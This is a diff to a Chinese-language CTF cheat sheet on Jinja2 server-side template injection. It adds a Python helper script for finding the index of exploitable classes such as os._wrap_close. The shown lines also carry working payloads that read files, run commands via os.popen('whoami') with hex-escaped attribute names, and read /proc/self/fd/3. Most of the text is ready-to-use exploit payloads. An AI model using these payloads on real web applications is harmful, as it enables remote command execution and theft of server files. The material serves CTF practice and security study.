@@ -125,13 +125,51 @@ your input object基类的子类
 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
 ```
 
+
+
+
+^
+## **找利用类**
+
 若经过{{''.__class__.__base__.__subclasses__()}}，用工具或手工查询存在的利用类和位置后，可以借助的类反射调用方法：
+
+下面是快速找位置脚本：
+```
+import json
+
+# 功能：快速找利用类的位置
+
+# {{class.bases[0].subclasses()}}的结果放a里
+a = """
+<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>
+"""
+
+num = 0
+allList = []
+
+result = ""
+for i in a:
+    if i == ">":
+        result += i
+        allList.append(result)
+        result = ""
+    elif i == "\n" or i == ",":
+        continue
+    else:
+        result += i
+
+for k, v in enumerate(allList):
+    if "os._wrap_close" in v: # 看你要找谁的位置
+        print(str(k) + "--->" + v)
+
+```
+
+案例：
 ```
 <class 'warnings.catch_warnings'>，没有内置os模块可能在第59位。可以导入后命令执行。
 <class 'site._Printer'> 内含os模块（不需要import os） ，可能在第71位，可以借助这些类来执行命令。
 _io.TextIOWrapper 可以文件读取，可能在122位。
 ```
-
 大多数题目的flag均藏在系统中的某个文件内。
 
 1、warnings.catch_warnings类利用：
@@ -183,7 +221,7 @@ _io.TextIOWrapper 可以文件读取，可能在122位。
 {{config["\x5f\x5fclass\x5f\x5f"]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["os"]["popen"]("whoami")["read"]()}}
 
 利用frozen_importlib_external.FileLoader类
-get_data方法直接读文件
+get_data方法直接读打开过的文件内容
 {{()["\x5F\x5Fclass\x5F\x5F"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[91]["get\x5Fdata"](0, "/proc/self/fd/3")}}
 ```
 SSTI绕过注入:<https://xz.aliyun.com/t/3679#toc-11>
